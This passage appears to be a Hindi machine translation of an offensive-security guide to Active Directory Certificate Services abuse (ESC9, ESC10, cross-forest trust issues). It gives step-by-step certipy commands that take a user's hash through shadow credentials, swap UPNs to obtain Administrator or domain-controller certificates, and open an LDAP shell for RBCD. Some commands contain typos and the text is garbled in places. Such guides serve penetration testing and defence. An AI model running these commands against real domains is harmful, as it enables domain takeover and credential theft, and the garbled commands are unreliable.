- `StrongCertificateBindingEnforcement` को `2` पर समायोजित नहीं किया गया है (जिसका डिफ़ॉल्ट `1` है), या `CertificateMappingMethods` में `UPN` ध्वज शामिल है।
- प्रमाणपत्र को `msPKI-Enrollment-Flag` सेटिंग के भीतर `CT_FLAG_NO_SECURITY_EXTENSION` ध्वज से चिह्नित किया गया है।
- प्रमाणपत्र द्वारा कोई भी क्लाइंट प्रमाणीकरण EKU निर्दिष्ट किया गया है।
- किसी भी खाते पर `GenericWrite` अनुमतियाँ उपलब्ध हैं जिसका उपयोग किसी अन्य को कमजोर करने के लिए किया जा सकता है।

### दुरुपयोग स्थिति

मान लें `John@corp.local` के पास `Jane@corp.local` पर `GenericWrite` अनुमतियाँ हैं, जिनका लक्ष्य `Administrator@corp.local` को कमजोर करना है। `ESC9` प्रमाणपत्र टेम्प्लेट, जिसे `Jane@corp.local` को नामांकित करने की अनुमति है, इसके `msPKI-Enrollment-Flag` सेटिंग में `CT_FLAG_NO_SECURITY_EXTENSION` ध्वज के साथ कॉन्फ़िगर किया गया है।

शुरू में, `Jane` का हैश `John` के `GenericWrite` के उपयोग से प्राप्त किया जाता है:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
इसके बाद, `Jane` का `userPrincipalName` `Administrator` में संशोधित किया जाता है, जानबूझकर `@corp.local` डोमेन हिस्सा छोड़ दिया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
यह संशोधन बाधाएं उल्लंघित नहीं करता है, क्योंकि `Administrator@corp.local` को `Administrator` का `userPrincipalName` अलग रूप से बना रहता है।

इसके बाद, `ESC9` प्रमाणपत्र टेम्पलेट, जो विकल्पित चिह्नित है, `Jane` के रूप में अनुरोध किया जाता है:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
यह नोट किया गया है कि प्रमाणपत्र का `userPrincipalName` `Administrator` को प्रकट करता है, किसी भी "ऑब्जेक्ट SID" के बिना।

`Jane` का `userPrincipalName` फिर से उसके मूल, `Jane@corp.local` पर लौटाया जाता है:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
प्रकारित प्रमाणपत्र के साथ प्रमाणीकरण का प्रयास अब `Administrator@corp.local` का NT हैश देता है। प्रमाणपत्र के डोमेन निर्देशन की कमी के कारण आवश्यक है कि कमांड में `-domain <domain>` शामिल हो:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## दुर्बल प्रमाणपत्र मैपिंग - ESC10

### व्याख्या

डोमेन कंट्रोलर पर दो रजिस्ट्री कुंजी मान ESC10 द्वारा संदर्भित हैं:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` के तहत `CertificateMappingMethods` के लिए डिफ़ॉल्ट मान `0x18` (`0x8 | 0x10`) है, पहले `0x1F` पर सेट किया गया था।
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` के तहत `StrongCertificateBindingEnforcement` के लिए डिफ़ॉल्ट सेटिंग `1` है, पहले `0` था।

**मामला 1**

जब `StrongCertificateBindingEnforcement` को `0` के रूप में कॉन्फ़िगर किया जाता है।

**मामला 2**

यदि `CertificateMappingMethods` में `UPN` बिट (`0x4`) शामिल है।

### दुरुपयोग मामला 1

`StrongCertificateBindingEnforcement` को `0` के रूप में कॉन्फ़िगर करने पर, एक खाता A जिसमें `GenericWrite` अनुमतियाँ हैं, किसी भी खाता B को कम्प्रमाइज़ करने के लिए उपयोग किया जा सकता है।

उदाहरण के लिए, `Jane@corp.local` पर `GenericWrite` अनुमतियाँ होने पर, हमलावर `Administrator@corp.local` को कम्प्रमाइज़ करने का लक्ष्य रखता है। प्रक्रिया ESC9 को मिरर करती है, जिसमें किसी भी प्रमाणपत्र टेम्प्लेट का उपयोग किया जा सकता है।

शुरू में, `Jane` की हैश को शैडो क्रेडेंशियल का उपयोग करके प्राप्त किया जाता है, `GenericWrite` का शोषण करते हुए।
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
इसके बाद, `Jane` का `userPrincipalName` `Administrator` में बदल दिया जाता है, `@corp.local` भाग को जानबूझकर छोड़ दिया जाता है ताकि कोई प्रतिबंध उल्लंघन न हो।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
निम्नलिखित के अनुसार, एक प्रमाणपत्र जो क्लाइंट प्रमाणीकरण सक्षम करता है, `Jane` के रूप में अनुरोधित किया जाता है, डिफ़ॉल्ट `User` टेम्पलेट का उपयोग करके।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` फिर से उसके मूल, `Jane@corp.local` पर वापस किया जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
जिस प्राप्त प्रमाणपत्र के साथ प्रमाणीकरण किया जाएगा, उससे `Administrator@corp.local` का NT हैश प्राप्त होगा, प्रमाणपत्र में डोमेन विवरणों की अनुपस्थिति के कारण कमांड में डोमेन की विशेषण की आवश्यकता होगी।
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### दुरुपयोग मामला 2

`CertificateMappingMethods` में `UPN` बिट फ्लैग (`0x4`) शामिल होने के साथ, एक खाता A जिसमें `GenericWrite` अनुमतियाँ हैं, किसी भी खाता B को कंप्रोमाइज कर सकता है जिसमें `userPrincipalName` गुण नहीं है, जिसमें मशीन खाते और निर्मित डोमेन प्रशासक `Administrator` शामिल हैं।

यहाँ, लक्ष्य `DC$@corp.local` को कंप्रोमाइज करना है, `Jane` के हैश को शैडो क्रेडेंशियल के माध्यम से प्राप्त करके, `GenericWrite` का उपयोग करके।
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` का `userPrincipalName` फिर `DC$@corp.local` पर सेट किया जाता ह।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
एक प्रमाणपत्र क्लाइंट प्रमाणीकरण के लिए `Jane` के रूप में `User` टेम्पलेट का अनुरोध किया जाता है।
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` का `userPrincipalName` इस प्रक्रिया के बाद अपने मूल स्थिति में वापस लौट जाता है।
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
क्रमांकीकरण के लिए Schannel के माध्यम से प्रमाणीकरण करने के लिए, Certipy का `-ldap-shell` विकल्प प्रयोग किया जाता है, जिसमें प्रमाणीकरण सफलता को `u:CORP\DC$` के रूप में दर्शाया जाता है।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
प्रमाणीकरण एलडीएपी शैली के माध्यम से, `set_rbcd` जैसे कमांड रिसोर्स-आधारित सीमित प्रमाणीकरण (RBCD) हमलों को सक्षम करते हैं, जो संभावित रूप से डोमेन कंट्रोलर को कमजोर कर सकते हैं।
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
## विस्तार से समझाया गया वन विश्वास का उल्लंघन प्रमाणपत्रों के माध्यम से

### संक्रमित सीएएओ द्वारा वन विश्वासों का टोड़ना

**क्रॉस-वन वन विश्वास नामांकन** के लिए विन्यास सरल बनाया जाता है। **संसाधन वन से रूट सीए सर्टिफिकेट** को प्रशासक द्वारा **खाता वनों में प्रकाशित किया जाता है**, और **संसाधन वन से एंटरप्राइज सीए** सर्टिफिकेट **`NTAuthCertificates` और प्रत्येक खाता वन में AIA कंटेनर में जोड़े जाते हैं**। स्पष्ट करने के लिए, यह व्यवस्था **संसाधन वन में सीए को पूर्ण नियंत्रण प्रदान करती है** सभी अन्य वनों पर जिनका पीकेआई वह प्रबंधित करता है। यदि यह सीए **हमलावरों द्वारा संक्रमित हो जाए**, तो सभी उपयोगकर्ताओं के लिए सर्टिफिकेट **उनके द्वारा जाली बनाए जा सकते हैं**, इसके फलस्वरूप वन की सुरक्षा सीमा टूट सकती है।

### विदेशी प्रिंसिपल्स को नामांकन विशेषाधिकार प्रदान किए गए

मल्टी-वन परिवेशों में, सतर्कता की आवश्यकता है जो एंटरप्राइज सीए द्वारा **प्रमाणपत्र टेम्पलेट प्रकाशित करते हैं** जो **प्रमाणित उपयोगकर्ता या विदेशी प्रिंसिपल्स** (उपयोगकर्ता/समूह जो एंटरप्राइज सीए के वन से बाहर हैं) **नामांकन और संपादन अधिकार** देते हैं।\
विश्वास के अधिकारण के दौरान, एडी द्वारा उपयोगकर्ता के टोकन में **प्रमाणित उपयोगकर्ता एसआईडी** जोड़ दिया जाता है। इस प्रकार, यदि किसी डोमेन में एक एंटरप्राइज सीए होता है जिसमें एक टेम्पलेट है जो **प्रमाणित उपयोगकर्ताओं को नामांकन अधिकार** देता है, तो एक टेम्पलेट को संभावित रूप से **एक विभिन्न वन से उपयोगकर्ता द्वारा नामांकित किया जा सकता है**। उसी तरह, यदि **टेम्पलेट द्वारा विदेशी प्रिंसिपल को नामांकन अधिकार स्पष्ट रूप से प्रदान किए जाते हैं**, तो एक **वन से एक अन्य वन में टेम्पलेट में नामांकन करने की संभावना होती है**, जिससे एक वन से दूसरे वन में प्रधान को **नामांकित करने का एक संक्रमित उपयोग-नियंत्रण संबंध** बन जाता है।

दोनों स्थितियाँ एक वन से दूसरे वन में हमले की सतह में वृद्धि करती हैं। सर्टिफिकेट टेम्पलेट की सेटिंग्स का शोध एक हमलावर द्वारा एक विदेशी डोमेन में अतिरिक्त प्राधिकार प्राप्त करने के लिए उपयोग किया जा सकता है।
